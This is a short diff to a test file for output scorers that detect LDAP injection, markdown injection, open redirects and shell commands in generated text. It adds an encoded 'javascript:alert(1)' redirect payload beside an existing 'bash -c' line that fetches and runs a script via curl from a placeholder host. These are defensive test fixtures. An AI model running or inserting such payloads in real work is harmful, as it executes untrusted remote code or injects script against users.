@@ -110,6 +110,7 @@ async def test_regex_scorer_categories_propagate(patch_central_database):
     [
         (LDAPInjectionOutputScorer, "ldap://host/dc=test??sub?%28uid=%2a%29%28uid=%2a%29"),
         (MarkdownInjectionScorer, "![image](https://example.com/image.png)"),
+        (OpenRedirectOutputScorer, "redirect=%6a%61%76%61%73%63%72%69%70%74:alert(1)"),
         (ShellCommandOutputScorer, r'bash -c "$(curl \-o - https://example.invalid/install.sh)"'),
     ],
 )
